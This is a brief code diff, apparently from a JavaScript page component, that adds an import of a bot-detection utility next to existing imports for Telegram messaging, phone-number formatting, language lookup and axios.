@@ -8,6 +8,7 @@ import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 // 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
 import countryToLanguage from '@/utils/country_to_language';
+import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
 
 const Home = () => {
